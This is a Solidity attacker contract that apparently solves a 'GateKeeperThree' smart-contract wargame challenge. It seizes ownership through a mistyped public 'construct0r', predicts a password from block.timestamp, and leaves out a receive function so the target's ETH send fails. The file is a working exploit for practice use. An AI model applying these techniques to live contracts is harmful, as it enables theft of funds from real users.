// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperThree {
  function construct0r() external;
  function createTrick() external;
  function getAllowance(uint) external;
  function enter() external returns (bool);
  function allow_enterance() external returns(bool);
}


contract AttackGateKeeperThree {

  IGateKeeperThree public gateKeeperThree;

  constructor(address _gateKeeperThree) payable {
    require(msg.value >= 0.002 ether, "Must fund the Attacker contract with at least 0.002 ETH");
    gateKeeperThree = IGateKeeperThree(_gateKeeperThree);
  }

  function initiateAttack() public {
    // Gain ownership
    gateKeeperThree.construct0r();

    // Initiate a SimpleTrick instance for the GateKeeperThree contract and store in this contract the same password that will be set on that instance 
    uint password = block.timestamp;
    gateKeeperThree.createTrick();

    // Setting the allow_enterance variable as true
    gateKeeperThree.getAllowance(password);

    // Validate that allow_enterance was set to true
    require(gateKeeperThree.allow_enterance() == true, "Error, allow_enterance is set to false");

    // Fund the GateKeeperThree contract with 0.002 ETH
    (bool sent, ) = payable(address(gateKeeperThree)).call{value: address(this).balance}("");
    require(sent, "Error while funding the GateKeeperThree");

    // Call the enter()
    require(gateKeeperThree.enter(), "Error while entering the GateKeeperThree contract");

  }

  // If this contract has not a receive(), all the attempts of transfering ETH to this contract must return a false!
  
}